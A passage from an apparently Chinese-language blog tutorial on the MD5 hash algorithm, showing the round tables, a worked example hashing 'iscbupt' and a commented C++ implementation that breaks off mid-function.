class="number">17</span>  <span class="number">7</span>][BCDA  <span class="number">7</span> <span class="number">22</span>  <span class="number">8</span>]</span><br><span class="line">[ABCD  <span class="number">8</span> <span class="number">7</span>  <span class="number">9</span>][DABC  <span class="number">9</span> <span class="number">12</span> <span class="number">10</span>][CDAB <span class="number">10</span> <span class="number">17</span> <span class="number">11</span>][BCDA <span class="number">11</span> <span class="number">22</span> <span class="number">12</span>]</span><br><span class="line">[ABCD <span class="number">12</span> <span class="number">7</span> <span class="number">13</span>][DABC <span class="number">13</span> <span class="number">12</span> <span class="number">14</span>][CDAB <span class="number">14</span> <span class="number">17</span> <span class="number">15</span>][BCDA <span class="number">15</span> <span class="number">22</span> <span class="number">16</span>]</span><br></pre></td></tr></table></figure></li><li><p>轮次二(G)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* [abcd k s i] a = b + ((a + G(b,c,d) + X[k] + T[i]) &lt;&lt;&lt; s). */</span></span><br><span class="line">[ABCD  <span class="number">1</span> <span class="number">5</span> <span class="number">17</span>][DABC  <span class="number">6</span> <span class="number">9</span> <span class="number">18</span>][CDAB <span class="number">11</span> <span class="number">14</span> <span class="number">19</span>][BCDA  <span class="number">0</span> <span class="number">20</span> <span class="number">20</span>]</span><br><span class="line">[ABCD  <span class="number">5</span> <span class="number">5</span> <span class="number">21</span>][DABC <span class="number">10</span> <span class="number">9</span> <span class="number">22</span>][CDAB <span class="number">15</span> <span class="number">14</span> <span class="number">23</span>][BCDA  <span class="number">4</span> <span class="number">20</span> <span class="number">24</span>]</span><br><span class="line">[ABCD  <span class="number">9</span> <span class="number">5</span> <span class="number">25</span>][DABC <span class="number">14</span> <span class="number">9</span> <span class="number">26</span>][CDAB  <span class="number">3</span> <span class="number">14</span> <span class="number">27</span>][BCDA  <span class="number">8</span> <span class="number">20</span> <span class="number">28</span>]</span><br><span class="line">[ABCD <span class="number">13</span> <span class="number">5</span> <span class="number">29</span>][DABC  <span class="number">2</span> <span class="number">9</span> <span class="number">30</span>][CDAB  <span class="number">7</span> <span class="number">14</span> <span class="number">31</span>][BCDA <span class="number">12</span> <span class="number">20</span> <span class="number">32</span>]</span><br></pre></td></tr></table></figure></li><li><p>轮次三(H)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* [abcd k s i] a = b + ((a + H(b,c,d) + X[k] + T[i]) &lt;&lt;&lt; s). */</span></span><br><span class="line">[ABCD  <span class="number">5</span> <span class="number">4</span> <span class="number">33</span>][DABC  <span class="number">8</span> <span class="number">11</span> <span class="number">34</span>][CDAB <span class="number">11</span> <span class="number">16</span> <span class="number">35</span>][BCDA <span class="number">14</span> <span class="number">23</span> <span class="number">36</span>]</span><br><span class="line">[ABCD  <span class="number">1</span> <span class="number">4</span> <span class="number">37</span>][DABC  <span class="number">4</span> <span class="number">11</span> <span class="number">38</span>][CDAB  <span class="number">7</span> <span class="number">16</span> <span class="number">39</span>][BCDA <span class="number">10</span> <span class="number">23</span> <span class="number">40</span>]</span><br><span class="line">[ABCD <span class="number">13</span> <span class="number">4</span> <span class="number">41</span>][DABC  <span class="number">0</span> <span class="number">11</span> <span class="number">42</span>][CDAB  <span class="number">3</span> <span class="number">16</span> <span class="number">43</span>][BCDA  <span class="number">6</span> <span class="number">23</span> <span class="number">44</span>]</span><br><span class="line">[ABCD  <span class="number">9</span> <span class="number">4</span> <span class="number">45</span>][DABC <span class="number">12</span> <span class="number">11</span> <span class="number">46</span>][CDAB <span class="number">15</span> <span class="number">16</span> <span class="number">47</span>][BCDA  <span class="number">2</span> <span class="number">23</span> <span class="number">48</span>]</span><br></pre></td></tr></table></figure></li><li><p>轮次四 (I)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* [abcd k s i] a = b + ((a + I(b,c,d) + X[k] + T[i]) &lt;&lt;&lt; s). */</span></span><br><span class="line">[ABCD  <span class="number">0</span> <span class="number">6</span> <span class="number">49</span>][DABC  <span class="number">7</span> <span class="number">10</span> <span class="number">50</span>][CDAB <span class="number">14</span> <span class="number">15</span> <span class="number">51</span>][BCDA  <span class="number">5</span> <span class="number">21</span> <span class="number">52</span>]</span><br><span class="line">[ABCD <span class="number">12</span> <span class="number">6</span> <span class="number">53</span>][DABC  <span class="number">3</span> <span class="number">10</span> <span class="number">54</span>][CDAB <span class="number">10</span> <span class="number">15</span> <span class="number">55</span>][BCDA  <span class="number">1</span> <span class="number">21</span> <span class="number">56</span>]</span><br><span class="line">[ABCD  <span class="number">8</span> <span class="number">6</span> <span class="number">57</span>][DABC <span class="number">15</span> <span class="number">10</span> <span class="number">58</span>][CDAB  <span class="number">6</span> <span class="number">15</span> <span class="number">59</span>][BCDA <span class="number">13</span> <span class="number">21</span> <span class="number">60</span>]</span><br><span class="line">[ABCD  <span class="number">4</span> <span class="number">6</span> <span class="number">61</span>][DABC <span class="number">11</span> <span class="number">10</span> <span class="number">62</span>][CDAB  <span class="number">2</span> <span class="number">15</span> <span class="number">63</span>][BCDA  <span class="number">9</span> <span class="number">21</span> <span class="number">64</span>]</span><br></pre></td></tr></table></figure></li></ol><h2 id="4-案例">4. 案例</h2><p>用 MD5 算法处理 ASCII 码序列“iscbupt”</p><blockquote><p>我是手机拍的，懒得手打了，请见谅(❁´◡`❁)</p></blockquote><p><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_860eb4cc80-7.png" alt="7.png"><br><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_0ba3e3af80-8.png" alt="8.png"><br><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_0644992480-10.png" alt="10.png"><br><img src="https://cdn.acwing.com/media/article/image/2023/11/11/169037_8cbbe75980-9.png" alt="9.png"><br>在此特别强调的是,尽管前面提到 <code>MD5</code>的初始链接变量是:</p><p>A=0x01234567,B=0x89ABCDEF,C=0xFEDCBA98,D=0x76543210</p><p>但在运算过程中涉及大端(Big Endian)和小端 Little Endian)的转换问题，所以计算时首先应该将初始链接变量进行大小端的转换,运算结束后再进行一次大小端的转换即得 MD5 散列值。</p><p>完成第一个分组(即最后一个分组)处理后得散列值为:<br>$A=(0xDA456015+0x67452301)mod 2^{23}=0x418A8316$</p><p>$B=(0x231F2EC1+0xEFCDAB89)mod 2^{32}=0x12ECDA4A$</p><p>$C=(0xDAB4FBDA+0x98BADCFE)mod 2^{32} = 0x736FD8D8$</p><p>$D=(0xA7517CE9+0x10325476)mod2^{32}=0xB783D15F$</p><p>由此可得:<br>MD5(“iscbupt”)=“16838A414ADAEC12D8D86F735FD183B7”</p><h2 id="5-代码实现">5.代码实现</h2><blockquote><p>大量注释来袭 o((&gt;ω&lt; ))o</p><p>还有就是注意一个字就是 8bit，注意有地方看不懂是不是没换算的问题，如果还是不懂请评论留眼</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span> <span class="comment">// for uint* type,无符号的n位整数（unsigned n-bit integer）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span> <span class="comment">// for CHAR_BIT</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认的T</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> T[<span class="number">64</span>] = &#123;</span><br><span class="line">   <span class="number">0xd76aa478</span>, <span class="number">0xe8c7b756</span>, <span class="number">0x242070db</span>, <span class="number">0xc1bdceee</span>, <span class="number">0xf57c0faf</span>, <span class="number">0x4787c62a</span>, <span class="number">0xa8304613</span>, <span class="number">0xfd469501</span>,</span><br><span class="line">   <span class="number">0x698098d8</span>, <span class="number">0x8b44f7af</span>, <span class="number">0xffff5bb1</span>, <span class="number">0x895cd7be</span>, <span class="number">0x6b901122</span>, <span class="number">0xfd987193</span>, <span class="number">0xa679438e</span>, <span class="number">0x49b40821</span>,</span><br><span class="line">   <span class="number">0xf61e2562</span>, <span class="number">0xc040b340</span>, <span class="number">0x265e5a51</span>, <span class="number">0xe9b6c7aa</span>, <span class="number">0xd62f105d</span>, <span class="number">0x2441453</span>, <span class="number">0xd8a1e681</span>, <span class="number">0xe7d3fbc8</span>,</span><br><span class="line">   <span class="number">0x21e1cde6</span>, <span class="number">0xc33707d6</span>, <span class="number">0xf4d50d87</span>, <span class="number">0x455a14ed</span>, <span class="number">0xa9e3e905</span>, <span class="number">0xfcefa3f8</span>, <span class="number">0x676f02d9</span>, <span class="number">0x8d2a4c8a</span>,</span><br><span class="line">   <span class="number">0xfffa3942</span>, <span class="number">0x8771f681</span>, <span class="number">0x6d9d6122</span>, <span class="number">0xfde5380c</span>, <span class="number">0xa4beea44</span>, <span class="number">0x4bdecfa9</span>, <span class="number">0xf6bb4b60</span>, <span class="number">0xbebfbc70</span>,</span><br><span class="line">   <span class="number">0x289b7ec6</span>, <span class="number">0xeaa127fa</span>, <span class="number">0xd4ef3085</span>, <span class="number">0x4881d05</span>, <span class="number">0xd9d4d039</span>, <span class="number">0xe6db99e5</span>, <span class="number">0x1fa27cf8</span>, <span class="number">0xc4ac5665</span>,</span><br><span class="line">   <span class="number">0xf4292244</span>, <span class="number">0x432aff97</span>, <span class="number">0xab9423a7</span>, <span class="number">0xfc93a039</span>, <span class="number">0x655b59c3</span>, <span class="number">0x8f0ccc92</span>, <span class="number">0xffeff47d</span>, <span class="number">0x85845dd1</span>,</span><br><span class="line">   <span class="number">0x6fa87e4f</span>, <span class="number">0xfe2ce6e0</span>, <span class="number">0xa3014314</span>, <span class="number">0x4e0811a1</span>, <span class="number">0xf7537e82</span>, <span class="number">0xbd3af235</span>, <span class="number">0x2ad7d2bb</span>, <span class="number">0xeb86d391</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于获取循环左移的次数</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> SHIFT[<span class="number">4</span>][<span class="number">4</span>]&#123;</span><br><span class="line">   &#123;<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>&#125;,</span><br><span class="line">   &#123;<span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>&#125;,</span><br><span class="line">   &#123;<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>&#125;,</span><br><span class="line">   &#123;<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充位，0x80是一个十六进制数，表示一个二进制数10000000</span></span><br><span class="line"><span class="comment">//是因为填充的bit需要是一个1和若干个0</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span> PADDING[] = &#123;</span><br><span class="line">   <span class="number">0x80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">   <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于循环左移</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">Left_Rotate32</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">unsigned</span> <span class="type">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   num &amp;= <span class="number">31</span>;</span><br><span class="line">   <span class="keyword">return</span> (x &lt;&lt; num) | (x &gt;&gt; (-num &amp; <span class="number">31</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非线性函数FGHI</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">Logic_Function</span><span class="params">(<span class="type">int</span> Round_i, <span class="type">uint32_t</span> b, <span class="type">uint32_t</span> c, <span class="type">uint32_t</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> (Round_i)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">   <span class="keyword">return</span> c ^ (b | ~d);</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">   <span class="keyword">return</span> b ^ c ^ d;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">return</span> (b &amp; d) | (c &amp; ~d);</span><br><span class="line">   <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">   <span class="keyword">return</span> (b &amp; c) | (~b &amp; d);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取T[i]中的i (受到输入影响, 与当前轮数有关)</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title">Substituion</span><span class="params">(<span class="type">int</span> Round_i, <span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">switch</span> (Round_i)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">   <span class="keyword">return</span> i;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">   <span class="keyword">return</span> (<span class="number">1</span> + <span class="number">5</span> * i) % <span class="number">16</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">   <span class="keyword">return</span> (<span class="number">5</span> + <span class="number">3</span> * i) % <span class="number">16</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">   <span class="keyword">return</span> (<span class="number">7</span> * i) % <span class="number">16</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数是第i轮，ABCD，和消息分组M</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Round_Function</span><span class="params">(<span class="type">int</span> Round_i, <span class="type">uint32_t</span> buffer[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint32_t</span> message_block[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">//每轮需要进行16个步骤</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="comment">// 1.步函数执行</span></span><br><span class="line">   <span class="comment">// A + +Logic_Function_&#123;轮数&#125;(B,C,D)</span></span><br><span class="line">   buffer[<span class="number">0</span>] += <span class="built_in">Logic_Function</span>(Round_i, buffer[<span class="number">1</span>], buffer[<span class="number">2</span>], buffer[<span class="number">3</span>]);</span><br><span class="line">   <span class="comment">// A+M_i[k] (k 受到当前轮数以及迭代次数 i 的影响)</span></span><br><span class="line">   buffer[<span class="number">0</span>] += message_block[<span class="built_in">Substituion</span>(Round_i, i)];</span><br><span class="line">   <span class="comment">// A+T[i] (受到输入影响, 与当前轮数有关)</span></span><br><span class="line">   buffer[<span class="number">0</span>] += T[Round_i * <span class="number">16</span> + i];</span><br><span class="line">   <span class="comment">// A 循环左移 s 位 (s 由一个常量表给出)</span></span><br><span class="line">   buffer[<span class="number">0</span>] = <span class="built_in">Left_Rotate32</span>(buffer[<span class="number">0</span>], SHIFT[Round_i][i % <span class="number">4</span>]);</span><br><span class="line">   <span class="comment">// 最后A + B</span></span><br><span class="line">   buffer[<span class="number">0</span>] += buffer[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 2. 对缓冲区中的四个字按字右循环位移 1 个字</span></span><br><span class="line">   <span class="comment">// Buffer′=D′||A′||B′||C′</span></span><br><span class="line">   <span class="type">uint32_t</span> bufferCache = buffer[<span class="number">3</span>];</span><br><span class="line">   buffer[<span class="number">3</span>] = buffer[<span class="number">2</span>];</span><br><span class="line">   buffer[<span class="number">2</span>] = buffer[<span class="number">1</span>];</span><br><span class="line">   buffer[<span class="number">1</span>] = buffer[<span class="number">0</span>];</span><br><span class="line">   buffer[<span class="number">0</span>] = bufferCache;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//chain_vector即ABCD，消息分组message_block有16个子分组，每个子分组位32bit</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Hash_MD5</span><span class="params">(<span class="type">uint32_t</span> chain_vector[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint32_t</span> message_block[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// 将chain_vector赋给buffer，buffer作为中间tmp</span></span><br><span class="line">   <span class="type">uint32_t</span> buffer[<span class="number">4</span>];</span><br><span class="line">   <span class="built_in">memcpy</span>(buffer, chain_vector, <span class="number">128</span> / CHAR_BIT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 进行四轮迭代</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">   <span class="built_in">Round_Function</span>(i, buffer, message_block);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 将得到的结果和输入的CV_i按字(每 32-bit) 分组按位加. 得到最终输出结果CV_&#123;i+1&#125;.</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">   chain_vector[i] += buffer[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">__uint128_t</span> <span class="title">MD5</span><span class="params">(string _message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   //  1.预处理的消息</span></span><br><span class="line"><span class="comment">   //  填充和追加长度信息</span></span><br><span class="line"><span class="comment">   //  填充缓存数组</span></span><br><span class="line"><span class="comment">   //  附加messageBITcount，在c++中自然以尾序存储</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// 获取信息的长度,_message是还未处理的信息</span></span><br><span class="line">   <span class="type">uint64_t</span> messageLength = _message.<span class="built_in">length</span>();</span><br><span class="line">   <span class="comment">// 将信息的字节长度转换为位（bit）长度，CHAR_BIT通常指的是8</span></span><br><span class="line">   <span class="type">uint64_t</span> messageBitCount = messageLength * CHAR_BIT;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//计算需要多少个512位的块来存储信息</span></span><br><span class="line">   <span class="comment">//这里先将messageBitCount加上64，是因为后面需要填充原始消息开头的低64位</span></span><br><span class="line">   <span class="comment">//+1是为了C++默认向下取整，我们需要向上取整</span></span><br><span class="line">   <span class="type">int</span> blockCount = (messageBitCount + <span class="number">64</span> - <span class="number">1</span>) / <span class="number">512</span> + <span class="number">1</span>;</span><br><span class="line">   <span class="comment">//数组的大小是64 * blockCount，这样可以使信息的长度恰好是blockCount个512位的块的倍数。</span></span><br><span class="line">   <span class="type">uint8_t</span> message[<span class="number">64</span> * blockCount];</span><br><span class="line">   <span class="built_in">memcpy</span>(message, _message.<span class="built_in">c_str</span>(), messageLength);</span><br><span class="line">   <span class="comment">//在信息的末尾填充特定的填充字符，直到信息长度达到64的倍数,for语句中-8是为了填充原始消息开头的低64位</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = messageLength, j = <span class="number">0</span>; i &lt; (<span class="number">64</span> * blockCount - <span class="number">8</span>); i++)</span><br><span class="line">   message[i] = PADDING[j++];</span><br><span class="line">   <span class="comment">//在最后空缺的64位上填充  以64比特表示的原始消息长度</span></span><br><span class="line">   <span class="comment">//实际上是将messageBitCount的低64位添加到了message + (64 * blockCount - 8)后面</span></span><br><span class="line">   <span class="built_in">memcpy</span>(message + (<span class="number">64</span> * blockCount - <span class="number">8</span>), &amp;messageBitCount, <span class="number">64</span> / CHAR_BIT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 构建对象M，每一个M有16个子分组，每个子分组位32bit</span></span><br><span class="line">   <span class="type">uint32_t</span> *messageBuffer = <span class="keyword">new</span> <span class="type">uint32_t</span>[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   //  2.初始化CV</span></span><br><span class="line"><span class="comment">   //  注意CV1 的ABCD位大端序</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="type">uint32_t</span> res[<span class="number">4</span>] = &#123;<span class="number">0x67452301</span>, <span class="number">0xEFCDAB89</span>, <span class="number">0x98BADCFE</span>, <span class="number">0x10325476</span>&#125;;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; blockCount; i++)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="comment">// 更新 Message_Block，即M0，M1，M2。。。</span></span><br><span class="line">   <span class="built_in">memcpy</span>(messageBuffer, message + <span class="number">64</span> * i, <span class="number">64</span>);</span><br><span class="line">   <span class="comment">//对每一个M进行hash压缩函数</span></span><br><span class="line">   <span class="built_in">Hash_MD5</span>(res, messageBuffer);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   //  3.将最后得到的ABCD即res返回md5</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="type">__uint128_t</span> md5 = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">   md5 += (<span class="type">__uint128_t</span>)res[i] &lt;&lt; (i * <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//释放动态分配的内存</span></span><br><span class="line">       <span class="comment">//当你使用 new 关键字动态地分配内存时，在不再使用那块内存后使用 delete[] 来释放它</span></span><br><span class="line">       <span class="comment">//不释放动态分配的内存，那么程序可能会消耗掉所有的可用内存，导致所谓的内存泄漏</span></span><br><span class="line">   <span class="keyword">delete</span>[] messageBuffer;</span><br><span class="line">   <span class="keyword">return</span> md5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MD5_Print</span><span class="params">(<span class="type">__uint128_t</span> in)</span><span class="comment">//将128位整数的每一个字节以十六进制形式打印出来。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">//__uint128_t 是128位，但 printf 函数只能按字节（即8位）来处理数据。</span></span><br><span class="line">   <span class="comment">//所以，我们需要利用unsigned char逐个访问128位的整数按字节并拆分，然后逐个字节地打印。</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">char</span> *ptr = (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;in;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">       <span class="comment">//%02x 